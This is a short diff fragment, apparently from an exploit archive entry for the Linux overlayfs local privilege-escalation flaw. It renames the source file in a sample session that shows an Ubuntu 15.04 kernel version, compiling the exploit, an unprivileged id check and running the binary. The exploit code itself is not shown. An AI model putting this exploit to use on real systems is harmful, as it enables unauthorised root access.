@@ -11,7 +11,7 @@ overlayfs incorrect permission handling + FS_USERNS_MOUNT
 
 user@ubuntu-server-1504:~$ uname -a
 Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
-user@ubuntu-server-1504:~$ gcc exploit.c -o ofs
+user@ubuntu-server-1504:~$ gcc 5361.c -o ofs
 user@ubuntu-server-1504:~$ id
 uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
 user@ubuntu-server-1504:~$ ./ofs
